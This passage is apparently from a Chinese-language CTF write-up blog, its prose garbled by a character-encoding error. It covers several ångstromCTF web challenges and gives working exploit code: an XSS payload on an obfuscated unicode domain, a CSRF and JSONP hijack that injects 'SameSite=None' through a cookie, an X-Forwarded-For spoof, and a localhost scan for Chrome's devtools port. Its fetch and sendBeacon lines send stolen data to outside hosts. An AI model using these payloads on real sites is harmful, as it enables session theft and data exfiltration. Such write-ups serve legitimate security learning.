æˆç›¸åŒdomainè§£æçš„é—®é¢˜(ä¸ºäº†ç…§é¡¾ä¸åŒè¯­ç§ç”¨æˆ·)ã€‚</p><p>åŒæ—¶,htmlæ ‡ç­¾æ”¯æŒå¤§å°å†™ã€‚é‚£ä¹ˆæƒ³è¦ä¸é‡å¤å­—ç¬¦å¤§æ¦‚åªæœ‰ä¸€ç§æ–¹å¼äº†<br><code>&lt;SCRIPT src=//YOUR_DOMAIN&gt;</code><br>æ³¨æ„<code>//</code>è¿™ç§åŠ è½½æ–¹å¼ã€‚å¦‚æœè·‘åœ¨webæœåŠ¡å™¨ä¸Šï¼Œhttpså°±ä¼šè‡ªåŠ¨æ‰¾<code>https://YOUR_DOMAIN</code>,httpå°±ä¼šè‡ªåŠ¨æ‰¾<code>http://YOUR_DOMAIN</code>ã€‚</p><p>ä¸è¿‡æˆ‘ä»¬æ²¡æ³•ä¼ å…¥ä¿©ä¸ª<code>/</code>ã€‚å½“ç„¶,å°è¯•<code>hTtp:/xxx</code>ç¼©å‡ä¸€ä¸ª<code>/</code>ä¹Ÿæ˜¯å¯ä»¥çš„,å¯æƒœè¿™æ ·<code>t</code>å­—ç¬¦åˆä¼šé‡å¤ã€‚ç®€å•æµ‹è¯•äº†ä¸‹ï¼Œå‘ç°<code>\</code>å¯ä»¥æ›¿ä»£<code>/</code>(unicode  <code>/</code>å­—ç¬¦ä¸èƒ½æ›¿ä»£)ã€‚æ‰€ä»¥æœ€åè½¬ä¸‹domainä¸ºunicodeå°±å¯ä»¥äº†ã€‚(æˆ–è€…ä¹Ÿè®¸æœ‰dalao æœ‰ä¸è·Ÿå‰é¢å­—ç¬¦é‡å¤çš„çŸ­åŸŸåï¼Ÿ)è¿™é‡Œæˆ‘å› ä¸ºæ²¡å¼€https,æ²¡æœ‰åšå®¢ä»¥å¤–çš„åŸŸåï¼Œåªå¥½å» <a href="repl.it">repl.it</a> å¼€äº†ä¸ªä¸´æ—¶node 2333</p><p>domainçš„è½¬æ¢å¯ä»¥ä½¿ç”¨ <a href="https://splitline.github.io/domain-obfuscator/" target="_blank" rel="noopener">https://splitline.github.io/domain-obfuscator/</a> ä¹‹å‰åœ¨bamboofox CTFä¸­ç”¨è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url + <span class="string">'newcomp'</span>, data=&#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">"freq"</span>,</span><br><span class="line">        <span class="string">'cfg'</span>: <span class="string">"&lt;SCRIPT src=\/â…¹ï¼â„¬â“â“’ãŠµ4ã€‚áµ£â‚‘â‚šâ„“ï½¡â„­Âº&gt;"</span></span><br><span class="line">    &#125;, cookies=&#123;</span><br><span class="line">        <span class="string">'session'</span>: <span class="string">"eyJ1c2VybmFtZSI6ImJ5YzQwNiJ9.YGkXgQ.QZ2FZ8USqQHWcjStB4p6tTfbsUo"</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line">add()</span><br></pre></td></tr></table></figure><p>repl.itä¸Šæ”¾çš„æ˜¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'/?fakeuser=admin'</span>).then(<span class="function"><span class="params">r</span> =&gt;</span> r.text()).then(<span class="function"><span class="params">r</span> =&gt;</span> fetch(<span class="string">`https://x.byc404.repl.co/?flag=<span class="subst">$&#123;btoa(r)&#125;</span>`</span>,&#123;<span class="string">'mode'</span>:<span class="string">'no-cors'</span>&#125;))</span><br></pre></td></tr></table></figure><p>ps: å…¶å®è¿™ä¸ªunicodeçš„é—®é¢˜åœ¨nodejs 8åŠä»¥å‰å¾—ç‰ˆæœ¬è¡¨ç°å¾—æ¯”è¾ƒä¸¥é‡ã€‚å› ä¸ºå…¶<code>http</code>åº“åœ¨è¿™åŸºç¡€ä¸Šæ²¡æœ‰è¿‡æ»¤æ‰<code>\r\n</code>ã€‚ç›´æ¥å¯¼è‡´CRLFã€‚</p><h2 id="jason"><a href="#jason" class="headerlink" title="jason"></a>jason</h2><p>CSRFã€‚ æºç å…³é”®éƒ¨åˆ†å¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sameOrigin</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (req.get(<span class="string">'referer'</span>) &amp;&amp; !req.get(<span class="string">'referer'</span>).startsWith(process.env.URL))</span><br><span class="line"><span class="keyword">return</span> res.sendStatus(<span class="number">403</span>) </span><br><span class="line"><span class="keyword">return</span> next()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/passcode'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (req.body.passcode === <span class="string">'CLEAR'</span>) res.append(<span class="string">'Set-Cookie'</span>, <span class="string">'passcode='</span>)</span><br><span class="line"><span class="keyword">else</span> res.append(<span class="string">'Set-Cookie'</span>, <span class="string">`passcode=<span class="subst">$&#123;(req.cookies.passcode || <span class="string">''</span>)+req.body.passcode&#125;</span>`</span>)</span><br><span class="line"><span class="keyword">return</span> res.redirect(<span class="string">'/'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/visit'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (req.body.site.startsWith(<span class="string">'http'</span>)) <span class="keyword">try</span> &#123;<span class="keyword">await</span> jason.visit(req.body.site) &#125; <span class="keyword">catch</span> (e) &#123;<span class="built_in">console</span>.log(e)&#125;</span><br><span class="line"><span class="keyword">return</span> res.redirect(<span class="string">'/'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/languages'</span>, sameOrigin, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">res.jsonp(&#123;<span class="attr">category</span>: <span class="string">'languages'</span>, <span class="attr">items</span>: [<span class="string">'C++'</span>, <span class="string">'Rust'</span>, <span class="string">'OCaml'</span>, <span class="string">'Lisp'</span>, <span class="string">'Physical touch'</span>]&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/friends'</span>, sameOrigin, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">res.jsonp(&#123;<span class="attr">category</span>: <span class="string">'friends'</span>, <span class="attr">items</span>: [<span class="string">'Functional programming'</span>]&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/flags'</span>, sameOrigin, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.cookies);</span><br><span class="line"><span class="keyword">if</span> (req.cookies.passcode !== process.env.PASSCODE) <span class="keyword">return</span> res.sendStatus(<span class="number">403</span>)</span><br><span class="line">res.jsonp(&#123;<span class="attr">category</span>: <span class="string">'flags'</span>, <span class="attr">items</span>: [process.env.FLAG]&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7331</span>)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­visitéƒ¨åˆ†æ˜¯ä¸ª puppeteer çš„botè®¿é—®ã€‚</p><p>é¦–å…ˆå¾ˆæ˜æ˜¾ã€‚flagåœ¨jsonpå¤„ã€‚ç†è®ºä¸Šè·å¾—jsonpè¿”å›å€¼å³å¯ã€‚ä½†æ˜¯å®ƒä½œäº†refererçš„æ£€æŸ¥ã€‚è¿™ä¸ªå€’æ˜¯æŒºå¥½ç»•ã€‚å› ä¸ºå®ƒåªè€ƒè™‘äº†æœ‰refererçš„æƒ…å†µä¸‹éœ€è¦ä»å®ƒçš„ä¸»ç«™æ¥ã€‚æ‰€ä»¥ä¸å¸¦refererå³å¯ã€‚</p><p>ä½†æ˜¯ï¼Œæ­¤å¤„æˆ‘ä»¬æƒ³å¤–å¸¦dataå¿…ç„¶è¦åŠ«æŒjsonpã€‚ä¹Ÿå°±æ˜¯è¦è®©å…¶è¿”å›å†…å®¹ä½œä¸ºé¡µé¢ä¸‹çš„å¯æ§javascriptã€‚æ‰€ä»¥å¾—ç”¨scriptæ¥è·¨åŸŸåŠ è½½ã€‚ (ç°åœ¨chromeçš„CORBé˜²èŒƒçœŸçš„éå¸¸ä¸¥æ ¼ï¼Œscriptåªä¼šè·¨åŸŸåŠ è½½ text/javascriptçš„èµ„æº,ä¸è¿‡è¿˜å¥½jsonpæœ¬èº«å°±æ˜¯ç§è·¨åŸŸæ–¹å¼)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.referrerpolicy = <span class="string">'no-referrer'</span></span><br><span class="line">script.src = <span class="string">"http://127.0.0.1:7331/flags?callback=load"</span></span><br><span class="line"><span class="built_in">document</span>.head.appendChild(script)</span><br></pre></td></tr></table></figure><p>è·å¾—jsonpçš„æ–¹æ³•æ˜ç™½äº†ä¹‹åè¿˜æœ‰ä¸€ç‚¹æ³¨æ„ï¼Œæˆ‘ä»¬éœ€è¦adminå¸¦cookieè®¿é—®æ‰èƒ½è·å¾—flagsçš„jsonpå†…å®¹ã€‚ç„¶è€Œè¿™é‡Œæ˜¯express è‡ªå¸¦çš„jsonpè€Œä¸æ˜¯é‚£ç§phpè‡ªå†™çš„jsonpã€‚å…¶callbackå¹¶ä¸èƒ½åšåˆ°ä»»æ„å­—ç¬¦,ä¹Ÿå°±æ²¡æœ‰xssäº†ã€‚æ‰€ä»¥è¿™ä¸ªç«™å¹¶æ²¡æœ‰xssåˆ©ç”¨æ¥è·å–domçš„å†…å®¹</p><p>æ‰€ä»¥ã€‚å•çº¯åˆ©ç”¨csrfæ€ä¹ˆæ‰èƒ½æœ‰æƒè®¿é—®jsonpå‘¢ï¼Ÿè¿™é‡Œå¦‚æœæ³¨æ„åˆ°passcodeçš„å¥‡æ€ªå†™æ³•ï¼Œæ–¹æ³•å°±æ°´è½çŸ³å‡ºäº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.append(<span class="string">'Set-Cookie'</span>, <span class="string">`passcode=<span class="subst">$&#123;(req.cookies.passcode || <span class="string">''</span>)+req.body.passcode&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>æ­¤å¤„passcodeå®Œå…¨å¯æ§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨set-cookieåŸæœ¬çš„cookieååŠ å…¥ä»»æ„å†…å®¹ã€‚è¦åŠ ä»€ä¹ˆï¼Œæˆ–è€…è¯´èƒ½åŠ ä»€ä¹ˆï¼ŒMDNå†™çš„æ˜¯å¾ˆæ¸…æ¥šçš„<br><img src="https://hackmd.summershrimp.com/uploads/upload_f48c550dfca0159fbd55272b9452de57.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_f48c550dfca0159fbd55272b9452de57.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>cookieçš„å‡ ä¸ªå®‰å…¨å±æ€§ä¸­ã€‚httpOnlyä¸SameSite æ˜¯ç”¨çš„éå¸¸å¤šçš„ã€‚å…¶ä¸­httpOnlyå¯ä»¥é˜²æ­¢é€šè¿‡domè·å–cookie.SameSiteåˆ™æŒ‡å®šcookieçš„ä½œç”¨åŸŸã€‚å°¤å…¶åœ¨è·¨åŸŸè¯·æ±‚ä¸Šä½œç”¨å¾ˆå¤§ã€‚(å¦‚æœsamesite ä¸ºnone, å³ä½¿æ˜¯csrfä¹Ÿå¯ä»¥åˆ©ç”¨è·¨åŸŸè¯·æ±‚è¿›è¡Œxsleak)</p><p>ä¸€èˆ¬æ¥è¯´æ²¡æœ‰è®¾ç½®SameSite çš„è¯ï¼Œé»˜è®¤æ˜¯ä¸ºLaxçš„ã€‚ä¹Ÿå°±æ˜¯é»˜è®¤é˜²csrf.æ‰€ä»¥è¿™é‡Œç›´æ¥åˆ©ç”¨passcode è®¾ç½®ä¸ºNoneå³å¯ã€‚</p><p>æ³¨æ„çš„æ˜¯ã€‚ç°åœ¨SameSite ä¸ºNone.æ—¶ï¼Œå¿…é¡»è®¾ç½®Secureä¸ºtrue,ä¹Ÿå°±æ˜¯å¿…é¡»åœ¨httpsä¸Š(é™¤äº†localhost)æ‰æœ‰æ•ˆã€‚<br><img src="https://hackmd.summershrimp.com/uploads/upload_bcfd6ba59de0ccd6ec9717356a773f18.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_bcfd6ba59de0ccd6ec9717356a773f18.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œç®€å•å†™ä¸ªè¡¨å•æäº¤(å…¶ä»–è¯·æ±‚å¦‚fetchä¸ä¼šé¡ºç€è·³è½¬ã€‚è¿™æ ·set-cookie å°±æ²¡æ„ä¹‰äº†ã€‚)ã€‚æˆ‘ä»¬åœ¨æœ¬é¡µé¢å¼€ä¸ªæ–°çª—å£æ‰§è¡Œè¡¨å•åä¸€ç›´è°ƒç”¨ location.reload()åˆ·æ–°æœ¬é¡µé¢ã€‚è¿™æ ·ç­‰cookieåœ¨æˆ‘ä»¬çš„æ¶æ„htmlå¤„ç”Ÿæ•ˆæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¢«åŠ«æŒçš„loadäº†ã€‚è¿™é‡Œå¯ä»¥fetchè¯·æ±‚ä¸‹è‡ªå·±çš„ç«™å¤–å¸¦æ•°æ®ï¼Œä¹Ÿå¯ä»¥<code>navigator.sendBeacon</code> postæ•°æ®</p><p>è¿™é‡Œå› ä¸ºä»–è¿œç¨‹çš„puppeteer æ²¡æœ‰timeout.æ‰€ä»¥æœ€å¥½æŠŠinterValçš„é—´éš”è®¾çŸ­ç‚¹ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">        script.referrerpolicy = <span class="string">'no-referrer'</span></span></span><br><span class="line"><span class="actionscript">        script.src = <span class="string">"http://127.0.0.1:7331/flags?callback=load"</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.head.appendChild(script)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> load =  <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                navigator.sendBeacon(<span class="string">'https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234'</span>, <span class="built_in">window</span>.btoa(data))</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        w = <span class="built_in">window</span>.open(<span class="string">'poc2.html'</span>)</span></span><br><span class="line"><span class="javascript">        setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">                location.reload()</span><br><span class="line">        &#125;, 100)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:7331/passcode"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passcode"</span> <span class="attr">value</span>=<span class="string">"; SameSite=None; Secure"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>form.submit()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åæ¥çœ‹äº†å®˜æ–¹é¢˜è§£ã€‚åŸºæœ¬æ˜¯ä¸€è‡´çš„ã€‚ä¸è¿‡ä»–ç”¨<code>localStorage.done = true</code>ä¹Ÿå°±æ˜¯localStorageæ¥å­˜äº†ä¸ªæ ‡è®°å˜é‡ã€‚è¿™æ ·çš„è¯ä¿è¯åªä¼šåœ¨è¡¨å•æäº¤å¥½ï¼Œå¹¶ä¸”è·³è½¬å®Œåæ‰reload.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123; w.location.href &#125;</span><br><span class="line"><span class="keyword">catch</span> (e) &#123; localStorage.done = <span class="literal">true</span>; location.reload() &#125;</span><br><span class="line">&#125;, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p><code>actf{jason&#39;s_site_isn&#39;t_so_lax_after_all}</code></p><h2 id="Spoofy"><a href="#Spoofy" class="headerlink" title="Spoofy"></a>Spoofy</h2><p>è¿™é¢˜æ²¡åšã€‚ã€‚ã€‚ä½†æ˜¯è§£å‡ºäººæ•°æŒºå¤šçš„ã€‚åæ¥å‘ç°å¯èƒ½æ˜¯é”™è¿‡äº†ä¸€ç¯‡æ–‡ç« </p><p><a href="https://jetmind.github.io/2016/03/31/heroku-forwarded.html" target="_blank" rel="noopener">https://jetmind.github.io/2016/03/31/heroku-forwarded.html</a></p><p>ç®€å•çš„è¯´ã€‚å°±æ˜¯herokuå¯èƒ½ä¼šæŠŠçœŸå®ip appendåˆ°x-forwarded-for åã€‚å‡å¦‚ä¼ çš„æ—¶å€™å¸¦äº†ä¸¤ä¸ªxffã€‚å°±å¯èƒ½ä¼šè§£ææˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x-forwarded-for&quot; &quot;10.10.10.10,99.99.99.99,20.20.20.20&quot;&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ 99.99.99.99 æ˜¯è¢«åŠ è¿›å»çš„çœŸå®ipã€‚<br>æœ¬é¢˜æºç éƒ¨åˆ†åªè¦æ±‚xff é‡Œ<code>,</code> åˆ†å‰²åçš„ipé‡Œã€‚ç¬¬ä¸€ä¸ªä¸æœ€åä¸€ä¸ªç›¸åŒä¸”ä¸º<code>1.3.3.7</code>ã€‚æ‰€ä»¥åŠ ä¸ªé€—å·å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1.3.3.7</span><br><span class="line">X-Forwarded-For: , 1.3.3.7</span><br></pre></td></tr></table></figure><h2 id="Watered-Down-Watermark-as-a-Service"><a href="#Watered-Down-Watermark-as-a-Service" class="headerlink" title="Watered Down Watermark as a Service"></a>Watered Down Watermark as a Service</h2><p>è¿™é¢˜å› ä¸ºæ²¡æ—¶é—´å°±æ²¡çœ‹ã€‚ä½†æ˜¯è®°å¾—é¢˜ç›®ååœ¨diceCTFé‡Œå‡ºç°è¿‡ã€‚åæ¥èµ›åå‘ç°diceCTFçš„éé¢„æœŸåœ¨è¿™é‡Œè¿˜æœ‰ã€‚å½“æ—¶åœ¨discordé‡Œè§åˆ°æœ‰å¸ˆå‚…æåˆ°ç”¨chromeçš„devtools portåšçš„ã€‚å°è±¡è¿˜å¾ˆæ·±åˆ»ã€‚ä¸€æ–¹é¢ï¼ŒbyteCTF çº¿ä¸‹å†³èµ›æœ‰ä¸ªmarkdownxss, å¥½åƒæ˜¯æ‰¾æµè§ˆå™¨0day xss åå†åˆ©ç”¨chrome çš„devtools port æ¥ç€ã€‚å¦ä¸€æ–¹é¢æˆ‘è‡ªå·±å†™seleniumçˆ¬è™«æ—¶å‘ç°å¦‚æœè°ƒç”¨çš„æ˜¯<code>selenium-webdriver/chrome</code> ä¹Ÿå°±æ˜¯è‡ªå·±åº“é‡Œçš„chromeè€Œä¸æ˜¯æœ¬æœºçš„chromeæ—¶ï¼Œä¼šè‡ªåŠ¨å¼€ä¸ªdevtools ç«¯å£æ¥è°ƒè¯•ã€‚æ­¤é¢˜ç”¨åˆ°çš„puppeteerä¹Ÿæ˜¯ä¸€æ ·</p><p>é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯æ‰¾åˆ°devtools çš„ç«¯å£ã€‚ç”±äºå¯ä»¥é€šè¿‡http è®¿é—®ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦å°èŒƒå›´çˆ†ç ´å³å¯ã€‚æ³¨æ„æºç çš„é™åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">res.set(<span class="string">'X-Frame-Options'</span>, <span class="string">'deny'</span>);</span><br><span class="line">res.set(<span class="string">'X-Content-Type-Options'</span>, <span class="string">'nosniff'</span>);</span><br><span class="line">next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">visit</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!checkURL(url)) <span class="keyword">return</span> <span class="string">'no!!!!'</span></span><br><span class="line"><span class="keyword">let</span> ctx = <span class="keyword">await</span> (<span class="keyword">await</span> browser).createIncognitoBrowserContext()</span><br><span class="line"><span class="keyword">let</span> page = <span class="keyword">await</span> ctx.newPage()</span><br><span class="line">page.on(<span class="string">'framenavigated'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">frame</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!checkURL(frame.url())) <span class="keyword">return</span> <span class="string">'no!!!!'</span></span><br><span class="line">&#125;)</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkURL</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> urlobj = <span class="keyword">new</span> URL(url)</span><br><span class="line"><span class="keyword">if</span>(!urlobj.protocol || ![<span class="string">'http:'</span>,<span class="string">'https:'</span>].some(<span class="function"><span class="params">x</span>=&gt;</span>urlobj.protocol.includes(x)) || urlobj.hostname.includes(<span class="string">"actf.co"</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€æ–¹é¢é™åˆ¶äº†iframeã€‚( å¦‚æœé¡µé¢åŠ è½½å¤±è´¥ã€‚å®ƒä¼šå®šå‘åˆ°chrome://network-error/ã€‚è€Œè¿™ä¸ªå°±æ²¡æ³•åˆ¤æ–­äº†)ã€‚åŒæ—¶ä¹Ÿç”¨<code>X-Content-Type-Options</code>é™åˆ¶äº†script.ä¸èƒ½scriptè·¨åŸŸåŠ è½½ã€‚</p><p>æ‰€ä»¥æ­¤å¤„æˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–è·¨åŸŸè¯·æ±‚æ–¹æ³•ã€‚fetch + no-corså³å¯ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;byc&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">for (let port = 40000; port &lt; 45000; port++) &#123;</span></span><br><span class="line"><span class="regexp">    const url = `http:/</span><span class="regexp">/127.0.0.1:$&#123;port&#125;`</span></span><br><span class="line"><span class="regexp">    fetch(url, &#123;mode: 'no-cors'&#125;).then(res =&gt; &#123;</span></span><br><span class="line"><span class="regexp">        document.body.innerHTML += `\n$&#123;url&#125;`</span></span><br><span class="line"><span class="regexp">    &#125;)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://difajosdifjwioenriqoewrowifjaoijdaf.com"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.summershrimp.com/uploads/upload_9f8a44adf3b87817bffebb31c0f2cb28.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_9f8a44adf3b87817bffebb31c0f2cb28.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¹‹åæˆ‘ä»¬è®¿é—®å…¶<code>json/new</code>è·¯ç”±ã€‚ä»–ä¼š</p><blockquote><p>Opens a new tab. Responds with the websocket target data for the new tab.</p></blockquote><p>è¿™æ ·å°±ä¼šæ–°å¼€ä¸€ä¸ªæ ‡ç­¾é¡µã€‚ä¸”æˆ‘ä»¬èƒ½æ‰§è¡Œä»»æ„js.ä¸ºäº†è·å–flagè‡ªç„¶æ˜¯<code>http://127.0.0.1:40027/json/new?file:///app/flag.txt</code> æ¥ç”¨æµè§ˆå™¨æ‰“å¼€flag</p><p><img src="https://hackmd.summershrimp.com/uploads/upload_0755bcaf56fc15a780806f90ddb83fb7.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_0755bcaf56fc15a780806f90ddb83fb7.png" 